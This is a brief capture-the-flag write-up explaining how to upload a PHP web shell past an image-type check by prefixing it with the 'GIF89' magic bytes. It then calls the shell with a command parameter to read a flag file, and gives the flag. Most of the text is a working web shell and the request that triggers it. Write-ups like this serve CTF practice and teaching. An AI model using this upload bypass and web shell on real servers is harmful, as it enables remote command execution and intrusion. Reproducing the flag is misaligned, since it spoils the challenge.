Upload php shell and change the content to this (in short, add `GIF89` in the body content).
This will treat the request body as GIF file and will get uploaded to server.
```
GIF89
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

After that, it is just a `LFI`.
Request to: `GET /uploads/shell.php?cmd=cat+../../../../flag.txt` and you will get the flag.

Flag: `bucket{1_h4t3_PHP}`
